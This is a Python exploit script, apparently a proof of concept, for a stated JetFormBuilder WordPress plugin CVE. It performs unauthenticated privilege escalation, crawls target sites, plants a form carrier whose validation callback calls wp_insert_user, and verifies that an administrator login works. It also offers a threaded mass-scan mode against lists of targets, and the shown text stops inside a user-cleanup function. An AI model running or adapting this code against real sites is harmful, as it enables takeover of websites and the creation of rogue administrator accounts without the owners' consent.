#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
CVE-2026-12793 — JetFormBuilder <= 3.6.2
Unauthenticated Privilege Escalation · single target OR mass scan with threads.

FIXES in this version:
  * list mode no longer silences the whole terminal (was hiding the summary)
  * every INCONCLUSIVE now prints a REASON (dns / no hook / no plain post / no status)
  * --bootstrap-in-list allows full chain in mass mode (authorized labs only)
  * --global-hook lets you scan clones that share one hook
  * as_completed instead of ordered map => real parallel throughput
  * progress counter [i/N] printed live
"""

from __future__ import annotations

import argparse
import concurrent.futures
import html
import http.cookiejar
import ipaddress
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

# ----------------------------------------------------------------------
# ANSI colors
# ----------------------------------------------------------------------
class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"; ITALIC="\033[3m"
    RED="\033[31m"; GREEN="\033[32m"; YELLOW="\033[33m"; BLUE="\033[34m"
    MAGENTA="\033[35m"; CYAN="\033[36m"
    BRED="\033[91m"; BGREEN="\033[92m"; BYELLOW="\033[93m"; BBLUE="\033[94m"
    BMAGENTA="\033[95m"; BCYAN="\033[96m"

USE_COLOR = not bool(os.environ.get("NO_COLOR"))

def colorize(t, *c):
    return t if (not USE_COLOR or not c) else "".join(c) + t + C.RESET
def ok(t):   return colorize(t, C.BGREEN, C.BOLD)
def err(t):  return colorize(t, C.BRED, C.BOLD)
def warn(t): return colorize(t, C.BYELLOW, C.BOLD)
def info(t): return colorize(t, C.BCYAN, C.BOLD)
def note(t): return colorize(t, C.BMAGENTA, C.BOLD)
def good(t): return colorize(t, C.BGREEN)
def bad(t):  return colorize(t, C.BRED)
def dim(t):  return colorize(t, C.DIM)

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

FORM_KEY = "_jet_engine_booking_form_id"
REFER_KEY = "_jet_engine_refer"
DEFAULT_FIELD = "jfb_x7k2m9"
DEFAULT_CALLBACK = "wp_insert_user"
PATCHED_SSR = "3.6.5.3"

VERBOSE = False
READ_ONLY = False
INSECURE = False
LOCAL_ONLY = False
FOLLOW_ORIGIN = False
FAST = False
WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}

PRINT_LOCK = threading.Lock()
_TL = threading.local()

def _logbuf():
    if not hasattr(_TL, "buf"): _TL.buf = []
    return _TL.buf

def _reset_log():
    _TL.buf = []
    _TL.silent = False

def _silent():
    return getattr(_TL, "silent", False)

def _render(msg):
    if not USE_COLOR or not msg: return msg
    s = msg.lstrip(); ind = msg[:len(msg)-len(s)]
    if s.startswith("[+]"): return ind + colorize(s, C.BGREEN, C.BOLD)
    if s.startswith("[!]"): return ind + colorize(s, C.BRED, C.BOLD)
    if s.startswith("[*]"): return ind + colorize(s, C.BYELLOW, C.BOLD)
    if s.startswith("[i]"): return ind + colorize(s, C.BCYAN)
    return msg

def log(msg=""):
    r = _render(msg)
    if not _silent():
        with PRINT_LOCK:
            print(r, flush=True)
    _logbuf().append(r)

def rec(msg): _logbuf().append(msg)

def banner(title):
    log()
    if USE_COLOR:
        log(colorize("="*78, C.BCYAN, C.BOLD))
        log(colorize(title, C.BCYAN, C.BOLD))
        log(colorize("="*78, C.BCYAN, C.BOLD))
    else:
        log("="*78); log(title); log("="*78)

def kv(label, value, vc=""):
    lbl = colorize(f"{label:<20}:", C.BCYAN, C.BOLD) if USE_COLOR else f"{label:<20}:"
    val = colorize(value, vc) if (USE_COLOR and vc) else value
    log(f"{lbl} {val}")

# ----------------------------------------------------------------------
# scope
# ----------------------------------------------------------------------
def own_addresses():
    ips = {"127.0.0.1", "::1"}
    try: ips.update(socket.gethostbyname_ex(socket.gethostname())[2])
    except OSError: pass
    try: ips.update(a[4][0] for a in socket.getaddrinfo("localhost", None))
    except OSError: pass
    return ips

def is_local_origin(url):
    host = (urllib.parse.urlparse(url).hostname or "").strip("[]")
    if not host: return False
    try: resolved = {i[4][0] for i in socket.getaddrinfo(host, None)}
    except socket.gaierror: return False
    own = own_addresses()
    for ip in resolved:
        try: a = ipaddress.ip_address(ip.split("%")[0])
        except ValueError: return False
        if not (a.is_loopback or a.is_link_local or ip in own): return False
    return True

class TargetError(Exception):
    def __init__(self, msg, code=9): super().__init__(msg); self.code = code

def resolve_target(url, raise_on_fail=True):
    """Resolve hostname. Returns (ok, resolved_list, reason). In list mode, raise_on_fail=False
    makes it return rather than abort."""
    host = urllib.parse.urlparse(url).hostname
    if not host:
        msg = "no hostname in URL"
        log(f"[!] {msg}")
        if raise_on_fail: raise TargetError(msg)
        return False, [], msg
    host = host.strip("[]")
    try:
        resolved = sorted({i[4][0] for i in socket.getaddrinfo(host, None)})
    except socket.gaierror as e:
        msg = f"DNS resolution failed for '{host}': {e}"
        log(f"[!] {msg}")
        if raise_on_fail: raise TargetError(msg)
        return False, [], msg
    log(f"[+] resolved: {host} -> {', '.join(resolved)}")
    if LOCAL_ONLY and not is_local_origin(url):
        msg = "target is not local (--local-only set)"
        log(f"[!] {msg}")
        if raise_on_fail: raise TargetError(msg)
        return False, resolved, msg
    return True, resolved, ""

def canonical_origin(base, timeout):
    url = base.rstrip("/") + "/"
    for _ in range(4):
        r = GET(opener(), url, timeout=timeout, allow_redirects=False)
        if r.status not in (301,302,303,307,308) or not r.location:
            return "" if origin_of(url) == origin_of(base) else origin_of(url)
        nxt = urllib.parse.urljoin(url, r.location)
        if origin_of(nxt) == origin_of(url): return ""
        log(f"    [canonical] {url} -> {r.status} {r.location[:100]}")
        url = nxt
    return origin_of(url)

def discover_local_wordpress(timeout=4):
    hosts = ["127.0.0.1"]
    try: hosts.append(socket.gethostbyname("localhost"))
    except OSError: pass
    op = opener()
    for port in [8080, 8000, 8081, 8888, 3000, 5000, 80, 443, 8008, 9000]:
        for h in hosts:
            b = f"http://{h}:{port}"
            r = GET(op, b + "/", timeout=timeout)
            if r.status == 0: continue
            if any(k in r.body for k in ("wp-content","wp-includes","wp-login.php")):
                return b
    return ""

def probe_wp_base(base, timeout):
    op = opener()
    r = GET(op, base + "/wp-login.php", timeout=timeout, allow_redirects=False)
    if r.status in (200,302) and ("user_login" in r.body or "wp-submit" in r.body):
        return base
    for p in ("wordpress","wp","blog","site","wp1","cms"):
        c = f"{base.rstrip('/')}/{p}"
        rr = GET(op, c + "/wp-login.php", timeout=timeout, allow_redirects=False)
        if rr.status in (200,302) and ("user_login" in rr.body or "wp-submit" in rr.body):
            log(f"[+] WP at {c}")
            return c
    return base

# ----------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------
@dataclass
class Resp:
    method: str; url: str; status: int; headers: list; body: str
    final_url: str = ""; note: str = ""; sent: str = ""
    @property
    def location(self):
        for k,v in self.headers:
            if k.lower()=="location": return v
        return ""
    @property
    def resp_status(self):
        for s in (self.location, self.final_url or self.url, self.url):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(s).query)
            if q.get("status"): return q["status"][0]
        return ""
    def header(self, n):
        for k,v in self.headers:
            if k.lower()==n.lower(): return v
        return ""
    def as_json(self):
        try: return json.loads(self.body)
        except (ValueError, TypeError): return None
    def raw(self, mb=700):
        out = [colorize(f"--- RAW :: {self.method} {self.url} ---", C.BCYAN, C.BOLD)]
        if self.sent: out.append(colorize("sent: " + self.sent[:400], C.DIM))
        if self.note: out.append(colorize("note: " + self.note, C.BYELLOW, C.BOLD))
        s = f"HTTP {self.status}"
        sc = (C.BRED if self.status==0 else
              C.BGREEN if 200<=self.status<300 else
              C.BCYAN if 300<=self.status<400 else
              C.BYELLOW if 400<=self.status<500 else C.BRED)
        out.append(colorize(s, sc, C.BOLD))
        for k,v in self.headers:
            kl=k.lower()
            if kl=="location": out.append(colorize(f"{k}: {v}", C.BBLUE, C.BOLD))
            elif kl=="set-cookie": out.append(colorize(f"{k}: {v}", C.DIM))
            else: out.append(f"{k}: {v}")
        body = self.body if VERBOSE else self.body[:mb]
        if body.strip():
            out.append(""); out.append(body.rstrip())
            if not VERBOSE and len(self.body)>mb:
                out.append(colorize(f"... [{len(self.body)-mb} truncated]", C.DIM, C.ITALIC))
        return "\n".join(out)

def encode_form(d):
    pairs = []
    for n,v in d.items():
        if isinstance(v, dict):
            for k2,v2 in v.items(): pairs.append((f"{n}[{k2}]", str(v2)))
        elif isinstance(v, (list,tuple)):
            for x in v: pairs.append((n, str(x)))
        else: pairs.append((n, str(v)))
    return urllib.parse.urlencode(pairs)

def _request(op, method, url, data=None, referer=None, timeout=10,
             extra_headers=None, allow_redirects=True, raw_body=None, ctype=None,
             write_ok=False, collect=True):
    if READ_ONLY and method.upper() in WRITE_METHODS and not write_ok:
        log(f"    [read-only] blocked {method.upper()} {url}")
        return Resp(method.upper(), url, 0, [], "", note="blocked by --read-only")
    bb = raw_body if raw_body is not None else (
         encode_form(data).encode() if data is not None else None)
    req = urllib.request.Request(url, data=bb, method=method.upper())
    if bb is not None: req.add_header("Content-Type", ctype or "application/x-www-form-urlencoded")
    if referer: req.add_header("Referer", referer)
    for k,v in (extra_headers or {}).items(): req.add_header(k, v)

    use = op
    if not allow_redirects:
        class NR(urllib.request.HTTPRedirectHandler):
            def redirect_request(self,*_a,**_k): return None
        use = urllib.request.build_opener(NR)
        use.addheaders = [("User-Agent", UA)]

    sp = bb.decode("utf-8","replace") if bb else ""
    try:
        with use.open(req, timeout=timeout) as r:
            resp = Resp(method.upper(), url, r.status, list(r.headers.items()),
                        r.read().decode("utf-8","replace"), r.geturl(), sent=sp)
    except urllib.error.HTTPError as e:
        resp = Resp(method.upper(), url, e.code, list(e.headers.items()),
                    e.read().decode("utf-8","replace"), e.geturl() or url, sent=sp)
    except Exception as e:
        resp = Resp(method.upper(), url, 0, [], "", "",
                    note=f"{type(e).__name__}: {e}", sent=sp)
    if collect: rec(resp.raw())
    return resp

def opener(jar=None):
    hs = [urllib.request.HTTPCookieProcessor(jar)] if jar is not None else []
    if INSECURE:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        hs.append(urllib.request.HTTPSHandler(context=ctx))
    op = urllib.request.build_opener(*hs)
    op.addheaders = [("User-Agent", UA)]
    return op

def GET(op, url, **kw):  return _request(op, "get",  url, **kw)
def POST(op, url, **kw): return _request(op, "post", url, **kw)

# ----------------------------------------------------------------------
# parsing
# ----------------------------------------------------------------------
FORM_TAG_RE = re.compile(r"<form\b[^>]*>", re.I)
ATTR_RE = re.compile(r"([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*[\"']([^\"']*)[\"']")
INPUT_TAG_RE = re.compile(r"<input\b[^>]*>", re.I)
HREF_RE = re.compile(r"href=[\"']([^\"'#]+)[\"']", re.I)
LOC_RE = re.compile(r"<loc>\s*([^<\s]+)\s*</loc>", re.I)
REST_LINK_RE = re.compile(r"<link[^>]+rel=[\"']https://api\.w\.org/[\"'][^>]+href=[\"']([^\"']+)", re.I)
STABLE_TAG_RE = re.compile(r"^\s*Stable tag:\s*([0-9][0-9A-Za-z.\-]*)", re.M | re.I)

def attrs_of(t): return {k.lower(): html.unescape(v) for k,v in ATTR_RE.findall(t)}
def origin_of(u):
    p = urllib.parse.urlparse(u); return f"{p.scheme}://{p.netloc}" if p.netloc else u
def ver_tuple(v): return tuple(int(x) for x in re.findall(r"\d+", v)[:4]) or (0,)

def build_block_markup(fn, cb=DEFAULT_CALLBACK):
    a = {"name": fn, "field_type": "text",
         "validation": {"type": "advanced", "rules": [{"type": "ssr","value": cb,"message":"ok"}]}}
    return "<!-- wp:jet-forms/text-field {} /-->".format(json.dumps(a, separators=(",",":")))

def build_userdata(u,p,e,r,d=None):
    return {"user_login":u,"user_pass":p,"user_email":e,"role":r,"display_name":d or u}

@dataclass
class RenderedForm:
    page: str; action: str; hook_key: str = ""; hook_val: str = ""
    method: str = "reload"; form_id: int = 0; nonce: str = ""
    refer: str = ""; fields: list = field(default_factory=list); hidden: dict = field(default_factory=dict)

def parse_forms(purl, body):
    forms = []
    tags = FORM_TAG_RE.findall(body)
    for t in tags:
        a = attrs_of(t); action = a.get("action","")
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(action).query)
        if (qs.get("method") or [""])[0] not in ("reload","ajax"): continue
        rf = RenderedForm(page=purl, action=action, method=qs["method"][0])
        for k,v in qs.items():
            if k != "method" and v and re.fullmatch(r"[A-Za-z0-9]{4,16}", k) \
                    and re.fullmatch(r"[A-Za-z0-9]{6,24}", v[0]):
                rf.hook_key, rf.hook_val = k, v[0]
        forms.append(rf)
    if not forms: return forms
    positions = [body.lower().find(t.lower()[:80]) for t in tags]
    for m in INPUT_TAG_RE.finditer(body):
        a = attrs_of(m.group(0)); name, value = a.get("name",""), a.get("value","")
        if not name: continue
        idx = 0
        for i,p in enumerate(positions):
            if 0 <= p <= m.start(): idx = i
        rf = forms[min(idx, len(forms)-1)]
        if name == FORM_KEY and value.isdigit(): rf.form_id = int(value)
        elif name == REFER_KEY: rf.refer = value
        elif name == "_wpnonce": rf.nonce = value
        if a.get("type","").lower()=="hidden": rf.hidden[name] = value
        if not name.startswith("_"): rf.fields.append(name)
    for rf in forms: rf.fields = list(dict.fromkeys(rf.fields))
    return forms

# ----------------------------------------------------------------------
# site + crawl
# ----------------------------------------------------------------------
@dataclass
class Site:
    base: str; origin: str = ""; hook_key: str = ""; hook_val: str = ""
    method: str = "reload"
    forms: list = field(default_factory=list)
    post_ids: list = field(default_factory=list)
    form_post_ids: list = field(default_factory=list)
    plain_post_ids: list = field(default_factory=list)
    pages: list = field(default_factory=list)

SITEMAPS = ("/wp-sitemap.xml","/sitemap.xml","/sitemap_index.xml",
            "/?feed=rss2","/wp-sitemap-posts-post-1.xml","/wp-sitemap-posts-page-1.xml")

def _fetch_sitemaps(site, timeout):
    op = opener(); extra=[]; subs=[]
    def _one(sm): return sm, GET(op, site.base+sm, timeout=timeout, collect=False)
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for sm, sr in ex.map(_one, SITEMAPS):
            if sr.status != 200: continue
            for loc in LOC_RE.findall(sr.body):
                loc = html.unescape(loc).strip()
                if loc.endswith(".xml"): subs.append(loc)
                else: extra.append(loc)
            for loc in re.findall(r"<link>\s*([^<\s]+)\s*</link>", sr.body):
                extra.append(html.unescape(loc).strip())
    if subs:
        def _sub(u): return GET(op, u, timeout=timeout, collect=False)
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            for r in ex.map(_sub, subs[:8]):
                if r.status == 200:
                    extra += [html.unescape(x).strip() for x in LOC_RE.findall(r.body)]
    return extra

def crawl(site, seeds, max_pages, timeout):
    op = opener()
    r = GET(op, site.base + "/", timeout=timeout)
    site.pages.append(site.base + "/")
    m = REST_LINK_RE.search(r.body)
    site.origin = origin_of(html.unescape(m.group(1))) if m else origin_of(r.final_url or site.base)

    queue = [urllib.parse.urljoin(site.base, s) for s in seeds] + [site.base + "/"]
    queue += [u for u in _fetch_sitemaps(site, timeout) if u not in queue]

    def absorb(purl, body):
        pf = parse_forms(purl, body)
        for rf in pf:
            if rf.hook_key and not site.hook_key:
                site.hook_key, site.hook_val, site.method = rf.hook_key, rf.hook_val, rf.method
            if rf not in site.forms: site.forms.append(rf)
        pid = 0
        mm = re.search(r"[?&](?:p|page_id|post_id|preview_id)=(\d+)", purl)
        if mm: pid = int(mm.group(1))
        if not pid:
            mm = re.search(r'<body[^>]+class="[^"]*\bpostid-(\d+)\b', body)
            pid = int(mm.group(1)) if mm else 0
        if pid:
            if pid not in site.post_ids: site.post_ids.append(pid)
            if pf:
                if pid not in site.form_post_ids: site.form_post_ids.append(pid)
            else:
                if ("<article" in body or 'class="entry-content' in body or "postid-" in body):
                    if pid not in site.plain_post_ids: site.plain_post_ids.append(pid)
        for href in HREF_RE.findall(body):
            u = urllib.parse.urljoin(purl, html.unescape(href))
            if urllib.parse.urlparse(u).netloc != urllib.parse.urlparse(site.base).netloc: continue
            if u not in queue and u not in site.pages: queue.append(u)

    absorb(site.base + "/", r.body)
    if site.hook_key and site.plain_post_ids: return site

    while queue and len(site.pages) < max_pages:
        u = queue.pop(0)
        if u in site.pages or not u.startswith("http"): continue
        site.pages.append(u)
        rr = GET(op, u, timeout=timeout, referer=site.origin + "/")
        absorb(u, rr.body)
        if site.hook_key and site.forms and site.plain_post_ids: break
    return site

def rest_harvest(site, timeout):
    op = opener(); root = None
    for probe in (site.base + "/wp-json/", (site.origin or site.base) + "/wp-json/"):
        r = GET(op, probe, timeout=timeout, collect=False)
        if r.status == 200 and (r.as_json() or {}).get("routes"):
            root = probe; break
    if not root:
        r2 = GET(op, site.base + "/index.php?rest_route=/", timeout=timeout, collect=False)
        if r2.status == 200 and (r2.as_json() or {}).get("routes"):
            root = site.base + "/index.php?rest_route=/"
    if not root:
        log("    [rest] not reachable anonymously")
        return

    routes = (GET(op, root, timeout=timeout, collect=False).as_json() or {}).get("routes", {})
    SKIP = {"media","users","comments","blocks","templates","template-parts","navigation",
            "block-patterns","search","types","taxonomies","settings","statuses","categories",
            "tags","wp_pattern_category","wp-navigation","wp_block","wp_template",
            "wp_template_part","wp_global_styles","jet_form","jet-form","form-records",
            "actions","fields"}
    to_classify = []
    for name in sorted(routes):
        m = re.match(r"^/wp/v2/([a-z0-9_\-]+)$", name)
        if not m or m.group(1) in SKIP: continue
        slug = m.group(1); sep = "&" if "?" in root else "?"
        r = GET(op, f"{root.rstrip('/')}{name}{sep}per_page=50&_fields=id,link,type",
                timeout=timeout, collect=False)
        data = r.as_json() if r.status == 200 else None
        if not isinstance(data, list) or not data: continue
        for d in data:
            if not isinstance(d, dict) or not d.get("id"): continue
            pid, link = d["id"], d.get("link") or ""
            if pid not in site.post_ids: site.post_ids.append(pid)
            if slug in ("jet-form-builder","jet-forms"):
                if pid not in site.form_post_ids: site.form_post_ids.append(pid)
            elif link: to_classify.append((pid, link))

    if to_classify:
        def _classify(item):
            pid, link = item
            pr = GET(op, link, timeout=timeout, collect=False)
            if pr.status != 200: return pid, None
            return pid, bool(parse_forms(link, pr.body))
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(10, max(2, len(to_classify)))) as ex:
            for pid, is_form in ex.map(_classify, to_classify):
                if is_form is True and pid not in site.form_post_ids: site.form_post_ids.append(pid)
                elif is_form is False and pid not in site.plain_post_ids: site.plain_post_ids.append(pid)

    log(f"    [rest] ids={len(site.post_ids)} plain={len(site.plain_post_ids)} form={len(site.form_post_ids)}")

# ----------------------------------------------------------------------
# admin + bootstrap + plant
# ----------------------------------------------------------------------
def admin_session(base, user, password, timeout):
    jar = http.cookiejar.CookieJar(); op = opener(jar)
    r = POST(op, base + "/wp-login.php",
             {"log":user,"pwd":password,"wp-submit":"Log In","redirect_to":base+"/wp-admin/"},
             timeout=timeout)
    ok_ = any(c.name.startswith("wordpress_logged_in") for c in jar)
    return jar, op, ok_, r

def rest_root_and_nonce(op, base, timeout):
    r = GET(op, base + "/wp-admin/post-new.php", timeout=timeout)
    if r.status != 200: return None, None, r
    m = re.search(r'wpApiSettings\s*=\s*(\{[^}]*\})', r.body)
    root = json.loads(m.group(1)).get("root") if m else None
    n = re.search(r'createNonceMiddleware\(\s*"([a-f0-9]+)"', r.body)
    if not n and m: n = re.search(r'"nonce":"([a-f0-9]+)"', m.group(1))
    return _same_host(root, base), (n.group(1) if n else None), r

def _same_host(root, base):
    if not root: return root
    b,p = urllib.parse.urlsplit(base), urllib.parse.urlsplit(root)
    if not b.netloc or b.netloc == p.netloc: return root
    return urllib.parse.urlunsplit((p.scheme or b.scheme, b.netloc, p.path, p.query, ""))

def rest_url(root, path):
    if "?" in path: path, extra = path.split("?", 1)
    else: extra = ""
    p = urllib.parse.urlsplit(root)
    q = urllib.parse.parse_qs(p.query); q["rest_route"] = [path]
    tail = urllib.parse.urlencode(q, doseq=True)
    if extra: tail += "&" + extra
    return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, tail, ""))

def bootstrap_hook(site, args, timeout):
    out = {"ok": False, "form_id": 0, "page_id": 0, "why": "", "resp": None}
    jar, op, login_ok, lr = admin_session(site.base, args.admin_user, args.admin_pass, timeout)
    out["resp"] = lr
    if not login_ok:
        out["why"] = f"login failed as '{args.admin_user}' (HTTP {lr.status})"
        return out
    root, nonce, pn = rest_root_and_nonce(op, site.base, timeout)
    if not root or not nonce:
        out["why"] = "no wpApiSettings/nonce"
        out["resp"] = pn; return out
    hdr = {"X-WP-Nonce": nonce}
    form_content = ('<!-- wp:jet-forms/text-field {"name":"poc_bootstrap_field","field_type":"text"} /-->\n'
                    '<!-- wp:jet-forms/submit-field {"label":"Send"} /-->')
    r = _request(op, "post", rest_url(root, "/wp/v2/jet-form-builder"),
                 raw_body=json.dumps({"title":f"poc-bootstrap-{int(time.time())}",
                                      "status":"publish","content":form_content}).encode(),
                 ctype="application/json", extra_headers=hdr, timeout=timeout,
                 referer=site.base + "/wp-admin/post-new.php")
    d = r.as_json()
    if r.status not in (200,201) or not d or not d.get("id"):
        out["why"] = f"create form failed: HTTP {r.status}"
        out["resp"] = r; return out
    out["form_id"] = int(d["id"])
    log(f"    [+] form id {out['form_id']}")
    pc = f'<!-- wp:jet-forms/form-block {{"form_id":{out["form_id"]}}} /-->'
    r = _request(op, "post", rest_url(root, "/wp/v2/pages"),
                 raw_body=json.dumps({"title":f"poc-form-{int(time.time())}",
                                      "status":"publish","content":pc}).encode(),
                 ctype="application/json", extra_headers=hdr, timeout=timeout,
                 referer=site.base + "/wp-admin/post-new.php")
    d = r.as_json()
    if r.status not in (200,201) or not d or not d.get("id"):
        r = _request(op, "post", rest_url(root, "/wp/v2/pages"),
                     raw_body=json.dumps({"title":f"poc-form-{int(time.time())}",
                                          "status":"publish",
                                          "content":f'[jet_fb_form form_id="{out["form_id"]}"]'}).encode(),
                     ctype="application/json", extra_headers=hdr, timeout=timeout,
                     referer=site.base + "/wp-admin/post-new.php")
        d = r.as_json()
    if r.status not in (200,201) or not d or not d.get("id"):
        out["why"] = f"create page failed: HTTP {r.status}"
        out["resp"] = r; return out
    out["page_id"] = int(d["id"])
    link = d.get("link") or f"{site.base}/?page_id={out['page_id']}"
    log(f"    [+] page {out['page_id']} -> {link}")
    rr = GET(opener(), link, timeout=timeout)
    for rf in parse_forms(link, rr.body):
        if rf.hook_key:
            site.hook_key, site.hook_val, site.method = rf.hook_key, rf.hook_val, rf.method
            if rf not in site.forms: site.forms.append(rf)
            if out["page_id"] not in site.form_post_ids: site.form_post_ids.append(out["page_id"])
            out["ok"] = True
            out["why"] = f"hook leaked anonymously: ?{rf.hook_key}={rf.hook_val}"
            out["resp"] = rr
            return out
    out["why"] = f"page {link} rendered no form"
    out["resp"] = rr; return out

def plant(base, args, timeout):
    out = {"ok":False,"post_id":0,"link":"","why":"","resp":None,"field":args.field_name}
    jar, op, login_ok, lr = admin_session(base, args.admin_user, args.admin_pass, timeout)
    out["resp"] = lr
    if not login_ok:
        out["why"] = f"login failed as '{args.admin_user}'"; return out
    root, nonce, pn = rest_root_and_nonce(op, base, timeout)
    if not root or not nonce:
        out["why"] = "no wpApiSettings/nonce"; out["resp"] = pn; return out
    content = ("<!-- wp:paragraph -->\n<p>PoC carrier.</p>\n<!-- /wp:paragraph -->\n\n"
               + build_block_markup(args.field_name))
    r = _request(op, "post", rest_url(root, "/wp/v2/posts"),
                 raw_body=json.dumps({"title":f"CVE-2026-12793 carrier {int(time.time())}",
                                      "content":content,"status":"publish",
                                      "comment_status":"closed"}).encode(),
                 ctype="application/json", extra_headers={"X-WP-Nonce": nonce},
                 timeout=timeout, referer=base + "/wp-admin/post-new.php")
    out["resp"] = r; d = r.as_json()
    if r.status in (200,201) and isinstance(d, dict) and d.get("id"):
        out.update(ok=True, post_id=int(d["id"]), link=d.get("link",""))
        out["why"] = f"carrier {out['post_id']}"
    else:
        out["why"] = f"HTTP {r.status} {r.body[:100]}"
    return out

def delete_post(base, post_id, args, timeout):
    jar, op, login_ok, _ = admin_session(base, args.admin_user, args.admin_pass, timeout)
    if not login_ok or not post_id: return False
    root, nonce, _ = rest_root_and_nonce(op, base, timeout)
    if not root or not nonce: return False
    for bp in ("/wp/v2/posts","/wp/v2/pages","/wp/v2/jet-form-builder"):
        url = rest_url(root, f"{bp}/{post_id}") + "&force=true"
        r = _request(op, "delete", url, extra_headers={"X-WP-Nonce": nonce},
                     timeout=timeout, referer=base + "/wp-admin/edit.php")
        if r.status in (200,202):
            check = GET(op, rest_url(root, f"{bp}/{post_id}"), timeout=timeout)
            return check.status == 404
        if r.status != 404: break
    return False

# ----------------------------------------------------------------------
# submit + oracle
# ----------------------------------------------------------------------
def endpoint_of(site):
    return f"{site.base}/?{urllib.parse.quote(site.hook_key)}={urllib.parse.quote(site.hook_val)}&method={site.method}"

def submit_endpoints(site):
    if not site.hook_key: return []
    qs = f"?{site.hook_key}={site.hook_val}&method={site.method}"
    out, seen = [], set()
    for root in dict.fromkeys([site.base, site.origin or ""]):
        if not root: continue
        root = root.rstrip("/")
        for p in ("/","/index.php"):
            u = root + p + qs
            if u not in seen: seen.add(u); out.append(u)
    return out[:4]

def submit(site, fid, fields=None, nonce="", refer="", timeout=10, label="", endpoint=""):
    refer = refer or (site.origin + "/")
    data = {FORM_KEY: fid, REFER_KEY: refer, "__queried_post_id": "-1"}
    if nonce:
        data["_wpnonce"] = nonce
        data["_wp_http_referer"] = urllib.parse.urlparse(refer).path or "/"
    if fields: data.update(fields)
    log(f"    [submit] {label}form_id={fid}")
    r = POST(opener(), endpoint or endpoint_of(site), data, referer=refer,
             timeout=timeout, allow_redirects=False, write_ok=True)
    log(f"             -> HTTP {r.status} status={r.resp_status or 'NONE'}")
    return r

def detect(site, timeout, planted_id=0):
    log("[*] oracle (unauthenticated, non-destructive)")
    form_ids = set(site.form_post_ids) | {rf.form_id for rf in site.forms if rf.form_id}
    cands = []
    if planted_id: cands.append((planted_id, "", "planted carrier"))
    for pid in site.plain_post_ids:
        if pid not in form_ids and pid not in [c[0] for c in cands]:
            cands.append((pid, "", "plain post"))
    for pid in site.post_ids:
        if pid not in form_ids and pid not in [c[0] for c in cands]:
            cands.append((pid, "", "crawl id"))
    if not cands:
        return {"verdict":"inconclusive","proof":None,"form_id":None,
                "reason":"no plain (non-form) post id to test with",
                "why":"no NON-form post id was identified."}

    ref = None; saw = False; tried = []
    for ep in submit_endpoints(site):
        tried.append(ep)
        for fid, nonce, why in cands[:8]:
            r = submit(site, fid, nonce=nonce, timeout=timeout,
                       label=f"[{why}] ", endpoint=ep)
            st = r.resp_status
            if st: saw = True
            if st in ("success","nonce_failed","validation_failed"):
                return {"verdict":"vulnerable","proof":r,"form_id":fid,"endpoint":ep,
                        "reason":f"non-form id {fid} -> status={st}",
                        "why":f"non-form id {fid} answered status={st}; arbitrary post parsed as schema"}
            if st == "failed" and ref is None:
                ref = (fid, r, why, ep)
        if ref: break
        if saw: break

    if ref:
        fid, r, why, ep = ref
        return {"verdict":"patched","proof":r,"form_id":fid,"endpoint":ep,
                "reason":f"non-form id {fid} -> status=failed",
                "why":"set_form_id() rejected a non-form id"}
    if saw:
        return {"verdict":"inconclusive","proof":None,"form_id":None,
                "reason":"handler answered, but no usable status",
                "why":"the handler answered with a non-discriminating status"}
    return {"verdict":"inconclusive","proof":None,"form_id":None,
            "reason":"no HTTP status= returned by the form handler",
            "why":f"no status= at all. Endpoints: {', '.join(tried)}"}

# ----------------------------------------------------------------------
# verify + cleanup
# ----------------------------------------------------------------------
def verify_login(base, u, p, timeout=10):
    base = base.rstrip("/")
    jar = http.cookiejar.CookieJar(); op = opener(jar)
    r = POST(op, base + "/wp-login.php",
             {"log":u,"pwd":p,"wp-submit":"Log In","redirect_to":base+"/wp-admin/"},
             timeout=timeout)
    if not any(c.name.startswith("wordpress_logged_in") for c in jar):
        m = re.search(r'<div[^>]*id=["\']login_error["\'][^>]*>(.*?)</div>', r.body, re.S)
        reason = re.sub(r"<[^>]+>", " ", m.group(1)).strip()[:140] if m else "no auth cookie"
        return False, f"login rejected: {reason}", r, op
    dash = GET(op, base + "/wp-admin/", timeout=timeout)
    who = re.search(r'Howdy,\s*<[^>]*>?\s*([A-Za-z0-9_.@-]+)', dash.body)
    pl = GET(op, base + "/wp-admin/plugins.php", timeout=timeout)
    is_admin = (pl.status == 200 and "wp-admin/plugins.php" in pl.final_url
                and "sufficient permissions" not in pl.body.lower())
    ev = f"login OK as '{who.group(1) if who else '?'}'; admin={is_admin}"
    return bool(is_admin), ev, pl, op

def cleanup_user(base, username, args, timeout):
    jar, op, login_ok, _ = admin_session(base, args.admin_user, args.admin_pass, timeout)
    if not login_ok: return False
    users = GET(op, base + "/wp-admin/users.php", timeout=timeout)
    uid = nonce = None
    Q = "['" + '"' + "]"
    for m in re.finditer(r"<tr[^>]*id=" + Q + r"user-(\d+)" + Q + r"[^>]*>(.*?)</tr>",
                         users.body, re.S | re.I):
        row = m.group(2)
        if (re.search("aria-label=" + Q + re.escape(username) + Q, row)
                or re.search(r">\s*" + re.escape(username) + r"\s*<", row)):
            uid = m.group(1)
            mm = re.search(r"action=delete&(?:amp;)?user=\d+[^'\"]*?_wpnonce=([a-f0-9]+)", m.group(0))
            nonce = mm.group(1) if mm else None
            break
    if not uid or not nonce: return False
    cu = base + f"/wp-admin/users.php?action=delete&user={uid}&_wpnonce={nonce}"
    confirm = GET(op, cu, timeout=timeout, referer=base + "/wp-admin/users.php")
    if 'name="action" value="dodelete"' not in confirm.body: return False
    form = {"verifydelete":"1","action":"dodelete","submit":"Confirm Deletion"}
    for t in INPUT_TAG_RE.findall(confirm.body):
        a = attrs_of(t)
        if a.get("type","").lower() != "hidden" or not a.get("name"): continue
